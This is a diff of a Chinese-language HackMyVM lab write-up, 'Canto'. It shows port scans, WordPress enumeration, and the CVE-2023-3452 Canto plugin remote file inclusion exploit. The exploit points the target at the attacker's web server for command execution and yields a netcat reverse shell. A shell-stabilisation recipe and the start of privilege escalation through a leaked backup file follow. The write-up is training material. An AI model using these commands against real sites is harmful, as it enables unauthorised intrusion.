@@ -86,7 +86,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_canto.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>hmv_canto</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -110,17 +110,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -160,156 +150,160 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <hr>
 <h3><strong>1. 端口枚举及服务探测</strong></h3>
 <p>首先，使用 <code class="notranslate">nmap</code> 扫描目标 IP 的开放端口：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
 └─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
-Nmap scan report <span class="pl-k">for</span> 192.168.205.213
+Nmap scan report for 192.168.205.213
 Host is up (0.00026s latency).
 Not shown: 65533 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux<span class="pl-k">;</span> protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.57 <span class="pl-s"><span class="pl-pds">((</span>Ubuntu<span class="pl-pds">))</span></span>
+22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
 MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
 Device type: general purpose
-Running: Linux 4.X<span class="pl-k">|</span>5.X
+Running: Linux 4.X|5.X
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
 OS details: Linux 4.15 - 5.8
 Network Distance: 1 hop
-Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 10.13 seconds
-</pre></div>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds
+
+</code></pre>
 <p>扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</p>
 <hr>
 <h3><strong>2. Web 服务探测与Wordpress Plugin Canto远程执行漏洞</strong></h3>
 <p>对 80 端口感兴趣，访问 Web 页面，扫描一下结构</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
 └─$ whatweb http://192.168.205.213        
 http://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]
-                                                                                                </pre></div>
+                                                                                                
+</code></pre>
 <p>是WordPress，wpscan启动</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
-└─$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   <span class="pl-c"><span class="pl-c">#</span>api-token注册wpscan官网获取</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+└─$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-token注册wpscan官网获取
 _______________________________________________________________
          __          _______   _____
-         <span class="pl-cce">\ \ </span>       / /  __ <span class="pl-cce">\ </span>/ ____<span class="pl-k">|</span>
-          <span class="pl-cce">\ \ </span> /<span class="pl-cce">\ </span> / /<span class="pl-k">|</span> <span class="pl-k">|</span>__) <span class="pl-k">|</span> (___   ___  __ _ _ __ ®
-           <span class="pl-cce">\ \/</span>  <span class="pl-cce">\/</span> / <span class="pl-k">|</span>  ___/ <span class="pl-cce">\_</span>__ <span class="pl-cce">\ </span>/ __<span class="pl-k">|</span>/ _<span class="pl-s"><span class="pl-pds">`</span> <span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>_ \</span></span>
-<span class="pl-s"><span class="pl-s">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span>
-<span class="pl-s"><span class="pl-s">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">         WordPress Security Scanner by the WPScan Team</span></span>
-<span class="pl-s"><span class="pl-s">                         Version 3.8.27</span></span>
-<span class="pl-s"><span class="pl-s">       Sponsored by Automattic - https://automattic.com/</span></span>
-<span class="pl-s"><span class="pl-s">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span>
-<span class="pl-s"><span class="pl-s">_______________________________________________________________</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] URL: http://192.168.205.213/ [192.168.205.213]</span></span>
-<span class="pl-s"><span class="pl-s">[+] Started: Sun Dec 29 19:08:22 2024</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">Interesting Finding(s):</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] Headers</span></span>
-<span class="pl-s"><span class="pl-s"> | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Headers (Passive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confidence: 100%</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Direct Access (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confidence: 100%</span></span>
-<span class="pl-s"><span class="pl-s"> | References:</span></span>
-<span class="pl-s"><span class="pl-s"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] WordPress readme found: http://192.168.205.213/readme.html</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Direct Access (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confidence: 100%</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Direct Access (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confidence: 100%</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Direct Access (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confidence: 60%</span></span>
-<span class="pl-s"><span class="pl-s"> | References:</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span>
-<span class="pl-s"><span class="pl-s"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Rss Generator (Passive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> |  - http://192.168.205.213/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;</span></span>
-<span class="pl-s"><span class="pl-s"> |  - http://192.168.205.213/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] WordPress theme in use: twentytwentyfour</span></span>
-<span class="pl-s"><span class="pl-s"> | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/</span></span>
-<span class="pl-s"><span class="pl-s"> | Last Updated: 2024-11-13T00:00:00.000Z</span></span>
-<span class="pl-s"><span class="pl-s"> | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt</span></span>
-<span class="pl-s"><span class="pl-s"> | [!] The version is out of date, the latest version is 1.3</span></span>
-<span class="pl-s"><span class="pl-s"> | [!] Directory listing is enabled</span></span>
-<span class="pl-s"><span class="pl-s"> | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css</span></span>
-<span class="pl-s"><span class="pl-s"> | Style Name: Twenty Twenty-Four</span></span>
-<span class="pl-s"><span class="pl-s"> | Style URI: https://wordpress.org/themes/twentytwentyfour/</span></span>
-<span class="pl-s"><span class="pl-s"> | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...</span></span>
-<span class="pl-s"><span class="pl-s"> | Author: the WordPress team</span></span>
-<span class="pl-s"><span class="pl-s"> | Author URI: https://wordpress.org</span></span>
-<span class="pl-s"><span class="pl-s"> |</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Urls In Homepage (Passive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> |</span></span>
-<span class="pl-s"><span class="pl-s"> | Version: 1.1 (80% confidence)</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Style (Passive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: <span class="pl-pds">'</span></span>Version: 1.1<span class="pl-s"><span class="pl-pds">'</span></span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[i] No plugins Found.</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span>
-<span class="pl-s"><span class="pl-s"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[i] User(s) Identified:</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] erik</span></span>
-<span class="pl-s"><span class="pl-s"> | Found By: Rss Generator (Passive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> | Confirmed By:</span></span>
-<span class="pl-s"><span class="pl-s"> |  Wp Json Api (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span>
-<span class="pl-s"><span class="pl-s"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"> |  Login Error Messages (Aggressive Detection)</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] WPScan DB API OK</span></span>
-<span class="pl-s"><span class="pl-s"> | Plan: free</span></span>
-<span class="pl-s"><span class="pl-s"> | Requests Done (during the scan): 2</span></span>
-<span class="pl-s"><span class="pl-s"> | Requests Remaining: 23</span></span>
-<span class="pl-s"><span class="pl-s"></span></span>
-<span class="pl-s"><span class="pl-s">[+] Finished: Sun Dec 29 19:08:28 2024</span></span>
-<span class="pl-s"><span class="pl-s">[+] Requests Done: 57</span></span>
-<span class="pl-s"><span class="pl-s">[+] Cached Requests: 6</span></span>
-<span class="pl-s"><span class="pl-s">[+] Data Sent: 14.504 KB</span></span>
-<span class="pl-s"><span class="pl-s">[+] Data Received: 236.451 KB</span></span>
-<span class="pl-s"><span class="pl-s">[+] Memory used: 268.914 MB</span></span>
-<span class="pl-s"><span class="pl-s">[+] Elapsed time: 00:00:06</span></span>
-<span class="pl-s"><span class="pl-s">                                                    </span></span></pre></div>
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.205.213/ [192.168.205.213]
+[+] Started: Sun Dec 29 19:08:22 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.205.213/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://192.168.205.213/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+ |  - http://192.168.205.213/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwentyfour
+ | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/
+ | Last Updated: 2024-11-13T00:00:00.000Z
+ | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt
+ | [!] The version is out of date, the latest version is 1.3
+ | [!] Directory listing is enabled
+ | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css
+ | Style Name: Twenty Twenty-Four
+ | Style URI: https://wordpress.org/themes/twentytwentyfour/
+ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] erik
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 2
+ | Requests Remaining: 23
+
+[+] Finished: Sun Dec 29 19:08:28 2024
+[+] Requests Done: 57
+[+] Cached Requests: 6
+[+] Data Sent: 14.504 KB
+[+] Data Received: 236.451 KB
+[+] Memory used: 268.914 MB
+[+] Elapsed time: 00:00:06
+                                                    
+</code></pre>
 <p>然后我拿erik爆破了WordPress还爆破了ssh，都没有结果，回去看了眼网页发现他是WordPress，为什么起名Canto还写的有模样有的，我还以为是CMS呢，搜索了一下这个名字的漏洞</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ searchsploit Canto                  
 ----------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                       <span class="pl-k">|</span>  Path
+ Exploit Title                                                                                       |  Path
 ----------------------------------------------------------------------------------------------------- ---------------------------------
-NetScanTools Basic Edition 2.5 - <span class="pl-s"><span class="pl-pds">'</span>Hostname<span class="pl-pds">'</span></span> Denial of Service (PoC)                                  <span class="pl-k">|</span> windows/dos/45095.py
-Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          <span class="pl-k">|</span> multiple/webapps/49189.txt
-Wordpress Plugin Canto <span class="pl-k">&lt;</span> 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         <span class="pl-k">|</span> php/webapps/51826.py
+NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py
+Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt
+Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py
 ----------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-                           </pre></div>
+                           
+</code></pre>
 <p>然后我发现这不会是个插件吧，用了一下php/webapps/51826.py，发现还真是</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ searchsploit -m php/webapps/51826.py
-  Exploit: Wordpress Plugin Canto <span class="pl-k">&lt;</span> 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
+  Exploit: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
       URL: https://www.exploit-db.com/exploits/51826
      Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
     Codes: N/A
@@ -323,13 +317,13 @@ usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c
 51826.py: error: the following arguments are required: -u/--url, -LHOST/--local_host
 usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]
 
-Script to exploit the Remote File Inclusion vulnerability <span class="pl-k">in</span> the Canto plugin <span class="pl-k">for</span> WordPress - CVE-2023-3452
+Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452
 
 options:
-  -h, --help            show this <span class="pl-c1">help</span> message and <span class="pl-c1">exit</span>
+  -h, --help            show this help message and exit
   -u URL, --url URL     Vulnerable URL
   -s SHELL, --shell SHELL
-                        Local file <span class="pl-k">for</span> web shell
+                        Local file for web shell
   -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                         Local web server IP
   -LPORT LOCAL_PORT, --local_port LOCAL_PORT
@@ -337,14 +331,14 @@ options:
   -c COMMAND, --command COMMAND
                         Command to execute on the target
   -NC_PORT NC_PORT, --nc_port NC_PORT
-                        Listener port <span class="pl-k">for</span> netcat
+                        Listener port for netcat
 
     Examples:
     - Check the vulnerability
     python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33
 
-    - Execute a <span class="pl-c1">command</span>
-    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span>
+    - Execute a command
+    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'
 
     - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
     python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
@@ -352,51 +346,55 @@ options:
                                                                                               
 ┌──(kali㉿kali)-[~/test]
 └─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           
-Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php<span class="pl-k">?</span>wp_abspath=http://192.168.205.141:8080<span class="pl-k">&amp;</span>cmd=whoami
+Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
 Local web server on port 8080...
-192.168.205.213 - - [29/Dec/2024 19:37:27] <span class="pl-s"><span class="pl-pds">"</span>GET /wp-admin/admin.php HTTP/1.1<span class="pl-pds">"</span></span> 200 -
+192.168.205.213 - - [29/Dec/2024 19:37:27] "GET /wp-admin/admin.php HTTP/1.1" 200 -
 Server response:
-www-data</pre></div>
+www-data
+</code></pre>
 <p>后面就按照提示使用脚本就好了</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php
-Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php<span class="pl-k">?</span>wp_abspath=http://192.168.205.141:8080<span class="pl-k">&amp;</span>cmd=whoami
-invalid <span class="pl-k">local</span> port None
+Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
+invalid local port None
 Local web server on port 8080...
-192.168.205.213 - - [29/Dec/2024 19:25:16] <span class="pl-s"><span class="pl-pds">"</span>GET /wp-admin/admin.php HTTP/1.1<span class="pl-pds">"</span></span> 200 -
+192.168.205.213 - - [29/Dec/2024 19:25:16] "GET /wp-admin/admin.php HTTP/1.1" 200 -
 
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 8888                           
 listening on [any] 8888 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.213] 57360
-Linux canto 6.5.0-28-generic <span class="pl-c"><span class="pl-c">#</span>29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
  11:24:29 up 20 min,  0 user,  load average: 0.25, 2.51, 3.83
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
 <p>成功弹了回来</p>
 <h3>3.<strong>获得稳定 shell</strong></h3>
 <p>获得交互式 TTY shell：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash  
 ctrl+z  
-stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+stty raw -echo; fg  
 reset xterm  
-<span class="pl-k">export</span> TERM=xterm  
-<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
-<span class="pl-k">export</span> SHELL=/bin/bash  
-stty rows 59 cols 236</pre></div>
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+</code></pre>
 <h3>4.<strong>提权</strong></h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@canto:/home$ ls -al
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/home$ ls -al
 total 12
-drwxr-xr-x  3 root root     4096 May 12  2024 <span class="pl-c1">.</span>
+drwxr-xr-x  3 root root     4096 May 12  2024 .
 drwxr-xr-x 20 root root     4096 May 12  2024 ..
 drwxr-xr--  5 erik www-data 4096 May 12  2024 erik
-</pre></div>
+
+</code></pre>
 <p>发现我有erik的访问权限，进去溜达了一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@canto:/home/erik$ ls -al
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/home/erik$ ls -al
 total 36
-drwxr-xr-- 5 erik www-data 4096 May 12  2024 <span class="pl-c1">.</span>
+drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
 drwxr-xr-x 3 root root     4096 May 12  2024 ..
-lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -&gt; /dev/null
 -rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
 -rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
 drwx------ 2 erik erik     4096 May 12  2024 .cache
@@ -404,10 +402,10 @@ drwxrwxr-x 3 erik erik     4096 May 12  2024 .local
 -rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
 drwxrwxr-x 2 erik erik     4096 May 12  2024 notes
 -rw-r----- 1 root erik       33 May 12  2024 user.txt
-www-data@canto:/home/erik$ <span class="pl-c1">cd</span> notes/
+www-data@canto:/home/erik$ cd notes/
 www-data@canto:/home/erik/notes$ ls -al
 total 16
-drwxrwxr-x 2 erik erik     4096 May 12  2024 <span class="pl-c1">.</span>
+drwxrwxr-x 2 erik erik     4096 May 12  2024 .
 drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
 -rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
 -rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
@@ -427,25 +425,26 @@ Day1.txt
 
 Day2.txt
 
-我差点丢失了用户的数据库，所以我创建了一个备份文件夹。</pre></div>
+我差点丢失了用户的数据库，所以我创建了一个备份文件夹。
+</code></pre>
 <p>备份文件夹我很感兴趣，通常关于网站的应该都在<code class="notranslate">/var/www/</code>里</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@canto:/var/www$ ls -al
+<pre lang="bash" class="notranslate"><code class="notranslate">www-data@canto:/var/www$ ls -al
 total 16
-drwxr-xr-x  3 www-data www-data 4096 May 12  2024 <span class="pl-c1">.</span>
+drwxr-xr-x  3 www-data www-data 4096 May 12  2024 .
 drwxr-xr-x 15 root     root     4096 May 12  2024 ..
 -rw-------  1 www-data www-data  219 May 12  2024 .bash_history
 drwxr-xr-x  5 www-data www-data 4096 Dec 29 11:05 html
 www-data@canto:/var/www$ cat .bash_history
-<span class="pl-c1">cd</span> /var/wordpress
-<span class="pl-c1">cd</span> /var
-<span class="pl-c1">cd</span> /wordpress
-<span class="pl-k">export</span> TERM=xterm
+cd /var/wordpress
+cd /var
+cd /wordpress
+export TERM=xterm
 clear
 ls
-<span class="pl-c1">cd</span> wordpress
-<span class="pl-c1">cd</span> wordpres
+cd wordpress
+cd wordpres
 ls
-<span class="pl-c1">cd</span> backups
+cd backups
 ls
 clear
 ls
@@ -455,24 +454,27 @@ ls
 clear
 ls -la
 su erik
-<span class="pl-c1">cd</span> /var/wordpress/backups
+cd /var/wordpress/backups
 ls
 cat 12052024.txt
-<span class="pl-c1">exit</span>
-</pre></div>
+exit
+
+</code></pre>
 <p>有个<code class="notranslate">.bash_history</code>，答案显而易见了<code class="notranslate">/var/wordpress/backups/12052024.txt</code>，成功登录erik用户,<code class="notranslate">sudo -l</code>一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">erik@canto:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> erik on canto:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin<span class="pl-cce">\:</span>/snap/bin, use_pty
